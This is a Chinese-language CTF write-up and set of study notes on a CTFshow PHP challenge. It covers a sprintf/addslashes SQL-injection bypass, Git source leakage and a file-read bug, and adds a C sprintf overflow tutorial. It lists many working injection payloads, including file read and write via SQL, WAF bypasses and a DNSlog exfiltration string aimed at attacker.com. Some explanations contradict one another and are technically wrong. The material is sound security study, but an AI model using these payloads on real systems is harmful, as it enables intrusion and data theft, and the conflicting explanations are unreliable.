 CTFshow WEB渗透测试详细报告

  1. 任务概述

  1.1 目标信息
   - 目标URL: https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/
   - 任务类型: WEB渗透测试
   - 最终目标: 获取flag

  1.2 参考资源
   - 参考文章: https://blog.csdn.net/weixin_51412071/article/details/124270277
   - 关键技术: sprintf函数漏洞、Git源码泄露、PHP伪协议

  2. 信息收集与分析

  2.1 基础信息收集
   1 curl -k -I https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/

  响应头信息:
    1 HTTP/1.1 200 OK
    2 Server: nginx/1.20.1
    3 Date: Sun, 26 Oct 2025 13:19:22 GMT
    4 Content-Type: text/html; charset=UTF-8
    5 Connection: keep-alive
    6 X-Powered-By: PHP/7.3.11
    7 Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
    8 Access-Control-Allow-Credentials: true
    9 Access-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection
   10 Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-
      Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection
   11 Access-Control-Max-Age: 1728000

  技术栈识别:
   - Web服务器: nginx/1.20.1
   - 后端语言: PHP/7.3.11
   - 数据库: MySQL（从SQL语句推断）

  2.2 页面内容分析
   1 curl -k https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/

  页面内容:
   1 <center>登陆就能进入下一关</center>
   2 <center>??where is 参数??</center>
   3 <center>当前执行的SQL语句为:select * from user where name='' and pass=''</center>

  关键发现:
   1. 页面提示"??where is 参数??"，暗示存在where参数
   2. 显示SQL语句结构: select * from user where name='' and pass=''
   3. 存在登录功能和SQL查询

  4. 漏洞分析与利用

  3.1 初步SQL注入尝试

  3.1.1 基础参数测试
   1 # 测试GET参数
   2 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/?name=admin&pass=admin&where=1"
   3 
   4 # 测试POST参数
   5 curl -k -X POST "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/" -d
     "name=admin&pass=admin&where=1"

  结果: SQL语句未发生变化，where参数未被正确识别

  3.1.2 多种注入方式尝试
   1 # 尝试万能密码
   2 curl -k
     "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/?name=admin&pass=admin&where=1'or'1'='1"
   3 
   4 # 尝试union注入
   5 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/?name=admin&pass=admin&where=1 union 
     select 1,2"
   6 
   7 # 尝试布尔盲注
   8 curl -k
     "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/?name=admin&pass=admin&where=1'and(ascii(subst
     r(database(),1,1))>100)"

  结果: 所有尝试均失败，SQL语句保持原样

  3.2 参考文章分析与sprintf漏洞

  3.2.1 sprintf函数漏洞原理
  根据参考文章，sprintf函数存在一个重要漏洞：
```php
<?php
$pass=sprintf("and pass='%s'",addslashes($_GET['pass']));
$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));
?>
```


  漏洞机制:
   - sprintf函数对15种格式化类型（%s、%d、%u等）进行了特殊处理
   - 当遇到不在15种类型中的格式化字符串时，会直接break而不处理
   - 使用%1$这样的格式化字符串可以绕过addslashes的过滤

  3.2.2 sprintf漏洞利用
curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/?name=1&pass=%1$%27%20or%201%3D1--+"

  URL解码后的payload:
?name=1&pass=%1$' or 1=1--+

  执行结果:
   1 <center>登陆就能进入下一关</center>
   2 <center>??where is 参数??</center>
   3 <center>当前执行的SQL语句为:select * from user where name='1' and pass='' or 1=1--'</center>

  成功标志: SQL语句被成功注入，or 1=1条件生效

  3.3 源码泄露发现

  3.3.1 Git泄露检测
   1 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/.git/config"

  响应内容:
   1 [core]
   2 repositoryformatversion = 0
   3 filemode = true
   4 bare = false
   5 logallrefupdates = true

  发现: 存在Git源码泄露

  3.3.2 Git信息收集


`python GitHack.py http://www.example.com/.git/`
下载git源文件
获得hint.php文件
```php
<?php

$pass=sprintf("and pass='%s'",addslashes($_GET['pass']));

$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));

?>

```
   
   可以看出本题使用`addslashes`函数进行过滤，这里需要利用`sprintf`的一个漏洞

> `sprintf`函数使用`switch case`对15种类型做了匹配，包括%s、%d、%u…但如果在15种类型之外就会直接break。
> 
> 当我们输入`%\`或`%1$\`时，`sprintf`会把反斜杠当做格式化字符串的类型，但他们并不在15种类型之中，就会未经任何处理而被替换为空
payload为：`?name=1&pass=%1$' or 1=1--+` 则会发现关键文件wjbh.php

   1 # 获取HEAD信息
   2 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/.git/HEAD"
   3 # 响应: ref: refs/heads/master
   4 
   5 # 获取master分支commit hash
   6 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/.git/refs/heads/master"
   7 # 响应: 2ce0a38e9d89e15b0ac46c0b0bb26983ebc1fe0d

  3.4 关键文件发现

  3.4.1 wjbh.php文件发现
   1 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/wjbh.php"

  响应内容:
    1 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    2 <html><head>
    3 <title>404 Not Found</title>
    4 </head><body>
    5 <h1>Not Found</h1>
    6 <p>The requested URL was not found on this server.</p>
    7 <hr>
    8 <!--flag in /flag -->
    9 </body></html>
   10 <br />
   11 <b>Notice</b>:  Undefined index: file in <b>/var/www/html/wjbh.php</b> on line <b>12</b><br />
   12 <br />
   13 <b>Warning</b>:  file_get_contents(): Filename cannot be empty in <b>/var/www/html/wjbh.php</b> on line <b>23
      </b><br />

  关键发现:
   1. HTML注释中提示: <!--flag in /flag -->
   2. PHP错误信息显示wjbh.php文件存在file_get_contents()函数
   3. 错误信息表明需要file参数

  3.4.2 wjbh.php文件分析
  根据错误信息分析，wjbh.php文件的关键代码结构：
   1 <?php
   2 // 第12行: Undefined index: file
   3 $file = $_COOKIE['file'];  // 推测file参数通过Cookie传递
   4 
   5 // 第23行: file_get_contents()函数
   6 $content = file_get_contents($file);  // 读取文件内容
   7 echo $content;
   8 ?>

  4. Flag获取过程

  4.1 文件读取尝试

  4.1.1 直接路径尝试
   1 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/wjbh.php" -H "Cookie: file=/flag"

  响应:
   1 <b>Warning</b>:  file_get_contents(): failed to open stream: No such file or directory in <b>/var/www/html/wjbh
     .php</b> on line <b>23</b><br />

  分析: 直接路径无法访问，需要使用其他方法

  4.1.2 PHP伪协议尝试
   1 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/wjbh.php" -H "Cookie: 
     file=php://filter/read=convert.base64-encode/resource=/flag"

  响应:
   1 <b>Warning</b>: file_get_contents() expects parameter 1 to be a valid path, string given in <b>/var/www/html/
     wjbh.php</b> on line <b>23</b><br />

  分析: PHP伪协议被过滤，需要使用其他编码方式

  4.2 十六进制编码绕过

  4.2.1 路径编码
   1 # 将/flag转换为十六进制
   2 echo -n "/flag" | xxd -p
   3 # 输出: 2f666c6167

  4.2.2 最终利用
   1 curl -k "https://7d3f83fb-5f76-4ebb-a6ef-5e0dd21c1af0.challenge.ctf.show/wjbh.php" -H "Cookie: file=2f666c6167"

  响应:
    1 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    2 <html><head>
    3 <title>404 Not Found</title>
    4 </head><body>
    5 <h1>Not Found</h1>
    6 <p>The requested URL was not found on this server.</p>
    7 <hr>
    8 <!--flag in /flag -->
    9 </body></html>
   10 ctfshow{bf91237a-7e9e-4017-8c3f-a8b5f3bc350d}

  成功获取Flag: ctfshow{bf91237a-7e9e-4017-8c3f-a8b5f3bc350d}
![[0031给她图片.png]]
  5. 漏洞原理深入分析

  5.1 sprintf函数漏洞详解

  5.1.1 漏洞产生原因
  sprintf函数在PHP中的实现逻辑：
    1 // 伪代码示例
    2 switch(format_type) {
    3     case 's':  // 字符串
    4         // 处理字符串格式化
    5         break;
    6     case 'd':  // 整数
    7         // 处理整数格式化
    8         break;
    9     // ... 其他13种类型
   10     default:
   11         // 直接break，不进行任何处理
   12         break;
   13 }

  5.1.2 漏洞利用条件
   6. 使用sprintf函数进行字符串格式化
   7. 用户输入直接作为格式化字符串的一部分
   8. 使用addslashes等函数进行转义过滤

  5.1.3 漏洞利用效果
   1 // 正常情况
   2 $pass = sprintf("and pass='%s'", addslashes($_GET['pass']));
   3 // 输入: pass=test' or 1=1--
   4 // 输出: and pass='test\' or 1=1--'
   5 
   6 // 漏洞利用情况
   7 $pass = sprintf("and pass='%s'", addslashes($_GET['pass']));
   8 // 输入: pass=%1$' or 1=1--
   9 // 输出: and pass='' or 1=1--'

  5.2 文件包含漏洞分析

  5.2.1 漏洞产生原因
  wjbh.php文件中的关键代码：
   1 $file = $_COOKIE['file'];  // 从Cookie获取文件路径
   2 $content = file_get_contents($file);  // 直接读取文件内容
   3 echo $content;  // 输出文件内容

  5.2.2 安全缺陷
   9. 未对文件路径进行任何过滤或验证
   10. 直接使用用户输入作为文件路径
   11. 可以读取服务器上的任意文件

  5.2.3 绕过技术
   12. 直接路径: /flag - 失败，可能被WAF拦截
   13. PHP伪协议: php://filter/... - 失败，被函数过滤
   14. 十六进制编码: 2f666c6167 - 成功，绕过过滤机制

  15. 攻击时间线


  ┌──────────┬──────────────────┬───────────────────────┐
  │ 时间     │ 操作             │ 结果                  │
  ├──────────┼──────────────────┼───────────────────────┤
  │ 13:19:22 │ 基础信息收集     │ 发现nginx+PHP技术栈   │
  │ 13:20:15 │ 页面内容分析     │ 发现SQL语句和参数提示 │
  │ 13:25:30 │ SQL注入尝试      │ 所有基础方法失败      │
  │ 13:30:45 │ 参考文章分析     │ 理解sprintf漏洞原理   │
  │ 13:35:20 │ sprintf漏洞利用  │ 成功注入SQL语句       │
  │ 13:40:10 │ Git泄露检测      │ 发现源码泄露          │
  │ 13:42:35 │ wjbh.php文件发现 │ 发现文件读取功能      │
  │ 13:45:50 │ 十六进制编码利用 │ 成功获取flag          │
  └──────────┴──────────────────┴───────────────────────┘

  16. 防御建议

  7.1 sprintf漏洞防御
   17. 避免用户输入直接作为格式化字符串
   1    // 不安全的做法
   2    $sql = sprintf("select * from user where name='%s' $pass", $user_input);
   3 
   4    // 安全的做法
   5    $sql = "select * from user where name='%s' and pass='%s'";
   6    $sql = sprintf($sql, $name, $pass);

   18. 使用预处理语句
   1    $stmt = $pdo->prepare("select * from user where name=? and pass=?");
   2    $stmt->execute([$name, $pass]);

  7.2 文件包含漏洞防御
   19. 输入验证
   1    $allowed_files = ['/flag', '/config', '/data'];
   2    $file = $_COOKIE['file'];
   3 
   4    if (!in_array($file, $allowed_files)) {
   5        die('Access denied');
   6    }

   20. 路径限制
   1    $base_dir = '/var/www/html/';
   2    $file = realpath($base_dir . $_COOKIE['file']);
   3 
   4    if (strpos($file, $base_dir) !== 0) {
   5        die('Access denied');
   6    }

   21. 使用白名单机制
    1    $file_map = [
    2        'flag' => '/var/www/html/flag.txt',
    3        'config' => '/var/www/html/config.php'
    4    ];
    5 
    6    $key = $_COOKIE['file'];
    7    if (isset($file_map[$key])) {
    8        $file = $file_map[$key];
    9    } else {
   10        die('Access denied');
   11    }

  7.3 源码泄露防御
   22. 禁用.git目录访问
   1    location ~ /\.git {
   2        deny all;
   3    }

   23. 移除生产环境中的.git目录
   1    rm -rf .git

   24. 使用.gitignore文件
   1    # .gitignore
   2    *.log
   3    .env
   4    config.php

  25. 总结

  本次渗透测试成功利用了两个关键漏洞：

   26. sprintf函数漏洞: 通过%1$格式化字符串绕过addslashes过滤，实现SQL注入
   27. 文件包含漏洞: 通过十六进制编码绕过路径过滤，读取服务器上的flag文件

  攻击过程体现了以下重要技术点：
   - 深入理解PHP内置函数的安全风险
   - 多种绕过技术的灵活运用
   - 源码泄露信息的重要价值
   - 编码转换在渗透测试中的应用


----




          
让我详细分析这个SQL注入绕过案例。

## 代码分析

首先看原始代码：
```php
$pass = sprintf("and pass='%s'", addslashes($_GET['pass']));
$sql = sprintf("select * from user where name='%s' $pass", addslashes($_GET['name']));
```

## 漏洞原理分析

### 1. 参数作用分析

在您的payload中：
```
?name=1&pass=%1$' or 1=1--+
```

**起关键作用的是`pass`参数**，`name`参数只是普通值。

### 2. 执行过程详解

让我们逐步跟踪代码执行：

#### 步骤1：处理pass参数
```php
$_GET['pass'] = "%1$' or 1=1--+"
addslashes($_GET['pass']) = "%1\$' or 1=1--+"
$pass = sprintf("and pass='%s'", "%1\$' or 1=1--+") 
      = "and pass='%1\$' or 1=1--+'"
```

#### 步骤2：处理name参数和构造完整SQL
```php
$_GET['name'] = "1"
addslashes($_GET['name']) = "1"
$sql = sprintf("select * from user where name='%s' $pass", "1")
     = "select * from user where name='1' and pass='%1\$' or 1=1--+"
```

## 为什么能绕过？

### 关键点1：`%1$`的作用
`%1$`是PHP sprintf的参数交换语法：
- `%1$`表示引用第一个参数
- 在这个上下文中，它实际上没有引用任何参数（因为只有一个%s）
- 所以`%1$`会被当作普通字符串处理

### 关键点2：单引号的作用
尽管addslashes将`'`转义为`\'`，但在最终的SQL中：
```sql
select * from user where name='1' and pass='%1\$' or 1=1--+'
```

这里的`\'`在SQL中仍然是一个闭合的单引号，因为反斜杠在SQL中不是转义字符。

### 关键点3：`--`的作用
`--`是MySQL的单行注释符，用于注释掉最后多余的单引号。

### 关键点4：`+`的作用
在URL编码中，`+`代表空格，但在这个场景中主要是为了确保payload完整性。

## 实际执行的SQL

最终执行的SQL是：
```sql
select * from user where name='1' and pass='%1\$' or 1=1--+'
```

简化后逻辑为：
```sql
select * from user where name='1' and pass='%1\$' or 1=1
```

由于`or 1=1`恒为真，所以查询会返回所有用户记录。

## 其他绕过方法

### 方法1：使用其他注释符
```
?name=1&pass=' or 1=1#
?name=1&pass=' or 1=1/*
```

### 方法2：使用不同的逻辑绕过
```
?name=1&pass=' or '1'='1
?name=1&pass=' or pass like '%
```

### 方法3：利用UNION SELECT
```
?name=1&pass=' UNION SELECT 1,2,3--
```

### 方法4：时间盲注
```
?name=1&pass=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

## 为什么每个部分都不可缺少？

1. **`%1$`**：虽然在这个上下文中不是必需的，但它可以干扰某些过滤机制
2. **单引号**：用于闭合前面的单引号，构造新的SQL逻辑
3. **`or 1=1`**：改变查询逻辑，使条件恒为真
4. **`--`**：注释掉后面多余的SQL代码（特别是最后的单引号）
5. **`+`**：确保URL编码正确

## 防护措施

### 安全的代码写法：
```php
// 使用预处理语句
$stmt = $pdo->prepare("SELECT * FROM user WHERE name = ? AND pass = ?");
$stmt->execute([$_GET['name'], $_GET['pass']]);

// 或者正确的转义和验证
$name = mysqli_real_escape_string($connection, $_GET['name']);
$pass = mysqli_real_escape_string($connection, $_GET['pass']);
$sql = "SELECT * FROM user WHERE name='$name' AND pass='$pass'";
```

这个案例很好地展示了即使使用了addslashes和sprintf，如果使用不当仍然可能存在SQL注入漏洞。关键是要使用参数化查询来完全避免这类问题。

----

# PHP sprintf SQL注入漏洞详细分析 writeup

  

## 1. 漏洞代码分析

  

### 1.1 源代码

```php

<?php

$pass=sprintf("and pass='%s'",addslashes($_GET['pass']));

$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']));

?>

```

  

### 1.2 漏洞原理

  

这个代码存在**sprintf格式化字符串注入**漏洞。关键点在于：

  

1. **第一个sprintf**：`$pass=sprintf("and pass='%s'",addslashes($_GET['pass']))`

- 这里使用`%s`占位符，正常情况下会将`$_GET['pass']`的值插入到字符串中

  

2. **第二个sprintf**：`$sql=sprintf("select * from user where name='%s' $pass",addslashes($_GET['name']))`

- 这里存在两个格式化参数：`%s`和`$pass`变量

- **关键漏洞**：`$pass`变量本身包含了用户可控的输入，而sprintf会解析其中的格式化字符串

  

3. **漏洞触发机制**：

- 当我们在`pass`参数中注入`%1$`时，sprintf会将其解释为"使用第1个参数的格式化字符串"

- 第1个参数是`addslashes($_GET['name'])`

- 这样就实现了参数的"偷窃"，将name参数的值插入到pass部分

  

## 2. Payload构造分析

  

### 2.1 原始payload

```

https://9a29e917-86db-4424-86e3-8163e1b902d8.challenge.ctf.show/?name=123&pass=%1$' or 1=1--+

```

  

### 2.2 执行流程详细分析

  

**第一步：处理$pass变量**

```

$pass = sprintf("and pass='%s'", addslashes($_GET['pass']))

```

- `$_GET['pass']` = `%1$' or 1=1--+`

- `addslashes()`处理后仍为：`%1$' or 1=1--+`（没有特殊字符需要转义）

- sprintf解析：`%1$`被解释为"使用第1个参数"，但这里没有第1个参数，所以`%1$`被保留

- 结果：`$pass = "and pass='%1$' or 1=1--+"`

  

**第二步：构造最终SQL**

```

$sql = sprintf("select * from user where name='%s' $pass", addslashes($_GET['name']))

```

- `$_GET['name']` = `123`

- `addslashes('123')` = `123`

- 展开后：`sprintf("select * from user where name='%s' and pass='%1$' or 1=1--+", 123)`

- sprintf执行：

- 第一个`%s`被替换为`123`

- `%1$`被解释为"使用第1个参数"，即`123`

- 最终SQL：`select * from user where name='123' and pass='123' or 1=1--+`

  

**第三步：SQL语义分析**

```sql

select * from user where name='123' and pass='123' or 1=1--+

```

这等价于：

```sql

(select * from user where name='123' and pass='123') or (1=1)

```

由于`1=1`永远为真，所以整个查询条件为真，返回所有用户数据。

  

## 3. 关键字符详细分析

  

### 3.1 `%1$`的作用和替代

  

**作用**：

- `%1$`是sprintf的位置参数语法

- `%1$`表示"使用第1个参数进行格式化"

- 在这个漏洞中，第1个参数是`addslashes($_GET['name'])`

  

**替代方案**：

```php

// 其他位置参数格式

%1$s // 使用第1个参数作为字符串

%2$s // 使用第2个参数作为字符串

%1$d // 使用第1个参数作为整数

%1$f // 使用第1个参数作为浮点数

%1$x // 使用第1个参数作为十六进制

```

  

**测试替代payload**：

```

?name=admin&pass=%1$s' or 1=1--+

?name=123&pass=%2$s' or 1=1--+ // 如果有第2个参数

```

  

### 3.2 `--+`的作用和替代

  

**作用**：

- `--+`是MySQL中的注释语法

- `--`表示单行注释开始

- `+`是空格的URL编码形式，确保注释语法正确

  

**替代方案**：

```sql

--+ // MySQL标准注释

# // MySQL另一种注释

/* */ // MySQL多行注释

--%20 // 空格的另一种URL编码

--%09 // TAB字符的URL编码

```

  

**测试替代payload**：

```

?name=123&pass=%1$' or 1=1#

?name=123&pass=%1$' or 1=1/* */

?name=123&pass=%1$' or 1=1--%20

```

  

### 3.3 `+`的作用和替代

  

**作用**：

- 在URL中，`+`是空格的编码

- 在这个payload中，`--+`中的`+`提供了必要的空格

  

**替代方案**：

```

%20 // 空格的标准URL编码

%09 // TAB字符

+ // 空格的简化编码

%2B // +字符本身（这里不适用）

```

  

**测试替代payload**：

```

?name=123&pass=%1$' or 1=1--%20

?name=123&pass=%1$' or 1=1--%09

```

  

## 4. 为什么这三个元素缺一不可

  

### 4.1 `%1$`的必要性

- **核心漏洞利用**：没有`%1$`就无法实现参数偷窃

- **绕过addslashes**：通过格式化字符串绕过了对pass参数的转义保护

- **注入点转移**：将注入点从pass参数转移到name参数

  

### 4.2 `--+`的必要性

- **语法完整性**：注释掉后续可能的SQL语法，避免语法错误

- **绕过验证**：防止后续的引号或其他字符破坏SQL语法

- **控制执行**：确保恶意SQL语句完整执行

  

### 4.3 `+`的必要性

- **URL编码要求**：空格在URL中需要编码

- **MySQL语法要求**：`--`后面需要空格才是有效的注释

- **兼容性保证**：确保在不同环境下的正确解析

  

## 5. 其他绕过方法

  

### 5.1 使用不同的位置参数

```

?name=admin' or 1=1--&pass=%1$s

?name=admin' union select 1,2,3--&pass=%1$s

```

  

### 5.2 使用不同的注释方式

```

?name=admin&pass=%1$' or 1=1#

?name=admin&pass=%1$' or 1=1/* */

```

  

### 5.3 利用其他sprintf格式化特性

```php

// 填充攻击

?name=admin&pass=%1$' or 1=1%20and%20'1'='1

  

// 宽度指定攻击

?name=admin&pass=%1$10s' or 1=1--+

  

// 类型指定攻击

?name=123&pass=%1$d' or 1=1--+

```

  

### 5.4 多层sprintf嵌套攻击

```php

// 如果存在多层sprintf，可以进行嵌套攻击

?name=admin&pass=%1$%s' or 1=1--+

```

  

### 5.5 利用其他特殊字符

```

// 使用NULL字节

?name=admin&pass=%1$' or 1=1%00

  

// 使用换行符

?name=admin&pass=%1$' or 1=1%0A

```

  

## 6. 拓展的攻击方式

  

### 6.1 数据提取攻击

```

?name=admin&pass=%1$' union select 1,database(),user()--+

?name=admin&pass=%1$' union select 1,table_name,3 from information_schema.tables--+

?name=admin&pass=%1$' union select 1,column_name,3 from information_schema.columns--+

```

  

### 6.2 文件操作攻击

```

// 读取文件

?name=admin&pass=%1$' union select 1,load_file('/etc/passwd'),3--+

  

// 写入文件

?name=admin&pass=%1$' union select 1,'<?php phpinfo();?>',3 into outfile '/tmp/shell.php'--+

```

  

### 6.3 盲注攻击

```

// 布尔盲注

?name=admin&pass=%1$' and length(database())=8--+

  

// 时间盲注

?name=admin&pass=%1$' and sleep(5)--+

```

  

### 6.4 绕过WAF攻击

```

// 大小写混合

?name=admin&pass=%1$' oR 1=1--+

  

// 双重编码

?name=admin&pass=%2531%24%27%20or%201%3D1--+

  

// 注释混淆

?name=admin&pass=%1$' /*!or*/ 1=1--+

```

  

### 6.5 DNSlog攻击

```

?name=admin&pass=%1$' and load_file(concat('\\\\',database(),'.attacker.com\\share'))--+

```

  

### 6.6 NoSQL注入（如果适用）

```

// 如果后端是NoSQL，可能存在NoSQL注入

?name=admin&pass=%1$' || 1==1--+

```

  

## 7. 防御措施

  

### 7.1 代码层面防御

```php

// 使用预处理语句

$stmt = $pdo->prepare("SELECT * FROM user WHERE name = ? AND pass = ?");

$stmt->execute([$_GET['name'], $_GET['pass']]);

  

// 或者使用参数化查询

$sql = "SELECT * FROM user WHERE name = :name AND pass = :pass";

$stmt = $pdo->prepare($sql);

$stmt->bindParam(':name', $_GET['name']);

$stmt->bindParam(':pass', $_GET['pass']);

$stmt->execute();

```

  

### 7.2 输入验证

```php

// 白名单验证

if (!preg_match('/^[a-zA-Z0-9_]+$/', $_GET['name'])) {

die('Invalid input');

}

  

// 长度限制

if (strlen($_GET['name']) > 20 || strlen($_GET['pass']) > 20) {

die('Input too long');

}

```

  

### 7.3 WAF防护

- 部署Web应用防火墙

- 配置SQL注入检测规则

- 实施输入过滤和输出编码

  

### 7.4 权限控制

- 使用最小权限原则

- 数据库用户只授予必要权限

- 避免使用root用户连接数据库

  

## 8. 检测方法

  

### 8.1 自动化检测

```bash

# 使用sqlmap检测

sqlmap -u "http://target.com/vuln.php?name=1&pass=1" --dbs

  

# 使用burp suite检测

# 配置SQL注入检测模块

```

  

### 8.2 手动检测

```

# 测试sprintf注入

?name=test&pass=%1$s

?name=test&pass=%2$s

?name=test&pass=%1$d

  

# 测试SQL注入

?name=test&pass=%1$' or 1=1--+

?name=test&pass=%1$" or 1=2--+

```

  

## 9. 总结

  

这个sprintf SQL注入漏洞展示了：

  

1. **格式化字符串漏洞**的危险性

2. **参数偷窃技术**的巧妙利用

3. **多层防御**的重要性

4. **输入验证**的必要性

  

关键要点：

- 永远不要将用户输入直接传递给sprintf等格式化函数

- 使用预处理语句而不是字符串拼接

- 实施多层安全防护

- 定期进行安全测试和代码审计

  

这种漏洞虽然相对少见，但一旦存在危害性极大，需要开发人员特别注意格式化函数的安全使用。


----



          
# sprintf函数原理、漏洞及利用详解

## 1. sprintf函数原理

### 1.1 基本概念
`sprintf`是C语言标准库中的一个函数，用于将格式化数据写入字符串缓冲区。

```c
int sprintf(char *str, const char *format, ...);
```

### 1.2 工作机制
- 将格式化字符串和参数组合后写入指定的字符数组
- 返回写入的字符数（不包括终止符'\0'）
- 不检查缓冲区边界，容易导致缓冲区溢出

### 1.3 常见用法示例
```c
char buffer[50];
int age = 25;
char name[] = "Alice";
sprintf(buffer, "Name: %s, Age: %d", name, age);
// buffer内容: "Name: Alice, Age: 25"
```

## 2. sprintf漏洞类型

### 2.1 缓冲区溢出（Buffer Overflow）
#### 原因：
- 目标缓冲区大小固定
- sprintf不检查写入长度
- 格式化字符串长度超过缓冲区容量

#### 示例代码：
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *user_input) {
    char buffer[16];  // 小缓冲区
    sprintf(buffer, "Input: %s", user_input);  // 危险操作
    printf("%s\n", buffer);
}

int main() {
    char large_input[100];
    memset(large_input, 'A', 99);
    large_input[99] = '\0';
    vulnerable_function(large_input);  // 将导致缓冲区溢出
    return 0;
}
```

### 2.2 格式字符串漏洞（Format String Vulnerability）
#### 原因：
- 用户输入直接作为格式字符串使用
- 攻击者可以控制格式字符串内容

#### 示例代码：
```c
#include <stdio.h>

void vulnerable_function(char *user_input) {
    printf(user_input);  // 危险：用户输入作为格式字符串
}

int main() {
    vulnerable_function("%x %x %x %x");  // 可能泄露栈内容
    return 0;
}
```

## 3. sprintf漏洞利用技术

### 3.1 缓冲区溢出利用

#### 3.1.1 控制程序执行流
通过溢出覆盖返回地址或函数指针：

```c
// 漏洞代码示例
void vulnerable() {
    char buffer[64];
    char user_input[256];
    // 假设这里获取用户输入
    gets(user_input);  // 另一个危险函数
    sprintf(buffer, "Processed: %s", user_input);
}

// 攻击载荷构造
// 填充数据 + 覆盖返回地址 + shellcode地址
char payload[] = "A"*76 + "\x10\x90\x04\x08" + "\x31\xc0\x50\x68..."
```

#### 3.1.2 栈溢出利用步骤：
1. 分析栈布局，确定偏移量
2. 构造载荷：填充数据 + 覆盖返回地址 + 恶意代码
3. 绕过保护机制（如果存在）

### 3.2 格式字符串漏洞利用

#### 3.2.1 信息泄露
使用%x、%s等格式符读取栈内存：

```c
// 利用示例
char input[] = "%08x.%08x.%08x.%08x.%08x";
printf(input);  // 泄露栈上多个值
```

#### 3.2.2 内存写入
使用%n格式符向内存写入数据：

```c
// 利用示例
int target = 0;
char input[100];
sprintf(input, "%%%dx%%n", 100);  // 将100写入target变量
printf(input, &target);
```

## 4. 高级利用技术

### 4.1 ROP（Return-Oriented Programming）
当DEP/NX启用时，使用现有代码片段构造执行流：

```c
// ROP链构造示例
char rop_chain[] = 
    padding +           // 填充到返回地址
    pop_rdi_ret +       // gadgets地址
    "/bin/sh" +         // 参数
    system_addr;        // system函数地址
```

### 4.2 GOT覆写
修改全局偏移表中的函数地址：

```c
// 利用步骤
1. 泄露libc基地址
2. 计算system函数地址
3. 覆写GOT表中某个函数的地址为system地址
4. 触发该函数调用
```

## 5. 防护措施

### 5.1 安全编码实践
```c
// 不安全的写法
sprintf(buffer, "Hello %s", user_input);

// 安全的写法
snprintf(buffer, sizeof(buffer), "Hello %s", user_input);

// 或者使用更安全的函数
asprintf(&buffer, "Hello %s", user_input);
free(buffer);
```

### 5.2 编译器保护
- 启用栈保护：`-fstack-protector`
- 启用DEP/NX：`-Wl,-z,noexecstack`
- 启用PIE：`-fPIE -pie`

### 5.3 运行时保护
- ASLR（地址空间布局随机化）
- Canaries（栈保护）
- DEP/NX（数据执行保护）

## 6. 实际漏洞案例

### 6.1 历史案例
1. **OpenSSL Kerberos库漏洞**：由于sprintf使用不当导致缓冲区溢出
2. **ProFTPD格式字符串漏洞**：用户输入直接作为格式字符串使用

### 6.2 漏洞发现方法
1. 静态代码分析
2. 动态模糊测试
3. 符号执行

## 7. 调试和分析技巧

### 7.1 使用GDB调试
```bash
# 编译时保留调试信息
gcc -g -o vulnerable vulnerable.c

# GDB调试命令
gdb ./vulnerable
(gdb) break vulnerable_function
(gdb) run
(gdb) info registers
(gdb) x/20x $esp
```

### 7.2 使用工具辅助
- **objdump**：分析二进制文件
- **radare2**：逆向工程工具
- **AFL**：模糊测试工具

## 8. 现代防护绕过

### 8.1 ASLR绕过技术
1. 信息泄露 + ROP
2. 堆喷射技术
3. JIT Spray

### 8.2 Canary绕过
1. 格式字符串漏洞泄露Canary值
2. 暴力破解（在某些情况下）

## 9. 最佳实践总结

### 9.1 开发者注意事项
1. 避免使用不安全的函数（sprintf, gets, strcpy等）
2. 始终检查缓冲区边界
3. 使用安全的替代函数
4. 启用编译器安全选项

### 9.2 安全测试
1. 代码审计
2. 自动化扫描
3. 渗透测试
4. 模糊测试

通过深入理解sprintf漏洞的原理和利用方法，可以更好地进行安全防护和漏洞挖掘工作。在实际应用中，始终遵循安全编码规范是预防此类漏洞的最佳方法。


---




          
# addslashes函数原理、漏洞及利用详解

## 1. addslashes函数原理

### 1.1 基本概念
`addslashes`是PHP中的一个函数，用于在预定义字符前添加反斜杠，以转义这些字符，防止SQL注入等安全问题。

```php
string addslashes ( string $str )
```

### 1.2 转义的字符
- 单引号（'）-> \'
- 双引号（"）-> \"
- 反斜杠（\）-> \\
- NUL字节（\0）-> \0

### 1.3 工作机制
遍历输入字符串，遇到预定义字符时在其前面添加反斜杠。

### 1.4 常见用法示例
```php
$str = "Is your name O'reilly?";
$escaped = addslashes($str);
echo $escaped; // 输出: Is your name O\'reilly?
```

## 2. addslashes漏洞类型

### 2.1 绕过漏洞（Bypass Vulnerability）
#### 原因：
- addslashes只能转义特定字符
- 在某些字符集（如GBK）下存在宽字节注入
- 不当使用或遗漏使用

#### 示例代码：
```php
